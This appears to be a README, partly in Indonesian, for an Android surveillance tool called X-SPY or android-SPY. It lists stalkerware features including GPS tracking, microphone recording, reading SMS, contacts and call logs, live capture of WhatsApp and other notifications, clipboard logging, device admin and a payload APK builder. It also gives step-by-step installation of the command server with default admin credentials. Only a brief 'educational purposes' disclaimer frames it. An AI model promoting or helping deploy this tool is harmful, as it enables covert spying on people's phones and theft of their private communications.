<p align="center">
<img src="" height="60"><br>
A cloud based Android Monitoring Tool
</p>

## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging (WhatsApp, Facebook, Instagram, Gmail and more ....)
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Command Queuing
- Device Admin
- Built In APK Builder



## Prerequisites 
 - Java Runtime Environment 11 or above
 - NodeJs 
 - A Server with Static IP Address

## Installation 
1. Install JRE 11 
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-11-jre`
    Jika terdapat pesan X:Unable to locate package , kamu bisa ketikan command berikut
        - "sudo add-apt repository ppa:openjdk-r/ppa"
        - "sudo apt-get update"
        - "sudo apt-get install openjdk-11-jre"
   
2. Install NodeJS [Instruction in here](https://nodejs.org/en/download/package-manager/)

3. install PM2 
    - `sudo npm install pm2 -g`

4. Clone the repo
    - `git clone https://github.com/eosageng/android-SPY.git`
    
5. Go to server directory
   - `cd android-SPY/server/`

5. In the server directory, ketikan command berikut ini
    - `npm install` <- Wajib Install , Gunakan NODEJS Versi Terbaru agar tidak error saat instal NPM
    - `pm2 start index.js` <-- start the script
    - `pm2 startup` <- untuk memulai X-SPY di startup

6. Cek IP Public `curl ifconfig.me`

7. In your browser navigate to your Server Static IP Address` Ex.: http://192.168.55.203`

8. Login details
     - `Username : admin`
     - `Password : password`
    
It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)


## Buy us a Coffee
   Bitcoin : 3HwzRLbZxFVxyZzLoEHFnoB5RVKfzwxDbf
   
   Paypal : SOON



## Disclaimer
<b>X-SPY tidak memberikan jaminan dengan software ini dan tidak akan bertanggung jawab atas kerusakan langsung atau tidak langsung yang disebabkan karena penggunaan alat ini.<br>
X-SPY dibangun untuk Tujuan Pendidikan. Gunakan dengan Risiko Anda sendiri</b>

<br>
<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">EosAP</a></p>
